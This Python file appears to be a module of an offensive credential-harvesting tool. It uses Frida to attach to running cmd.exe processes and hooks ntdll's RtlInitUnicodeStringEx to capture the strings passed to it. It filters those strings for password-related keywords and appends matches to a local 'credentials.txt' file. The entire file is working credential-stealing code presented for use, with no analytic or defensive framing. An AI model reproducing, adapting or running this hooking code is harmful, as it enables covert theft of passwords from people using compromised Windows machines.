from PyHook import wait_for_process, on_credential_submit
import frida


def wait_for():
    wait_for_process(["cmd.exe"], "CMD", hook)


def hook(pid):
    try:
        print("[ cmd-hook ] Trying To Attach To CMD")
        session = frida.attach(pid)
        print(f"[ cmd-hook ] Attached cmd with pid {pid}!")
        script = session.create_script("""
			var username;
			var password;
			var RtlInitUnicodeStringEx = Module.findExportByName("Ntdll.dll", "RtlInitUnicodeStringEx")			
			Interceptor.attach(RtlInitUnicodeStringEx, {
				onEnter: function (args) 
				{
					password = args[1];
				},
				onLeave: function (result)
				{

					var pass = password.readUtf16String();

					if (pass)
					{
						 send("\\n=============================" + "\\n[+] Intercepted Creds from CMD" +"\\n"+ "Keyword    : " + pass + "\\n=============================");
					}
				}
			});

		""")
        script.on('message', on_credential_submit_cmd)
        script.load()

    except Exception as e:
        print("[ cmd-hook ] Unhandled exception: " + str(e))
        print("[ cmd-hook ] Continuing...")


def on_credential_submit_cmd(message, data):
    targeted_keywords = ["-p", "pass", "password", "net"]

    credential_dump = message["payload"]
    if any(keyword for keyword in targeted_keywords if keyword in credential_dump):

        print("[ cmd-hook ] Parsed credentials submitted to cmd prompt:")
        print(credential_dump)
        with open("credentials.txt", "a") as stolen_credentials_file:
            stolen_credentials_file.write(credential_dump + '\n')
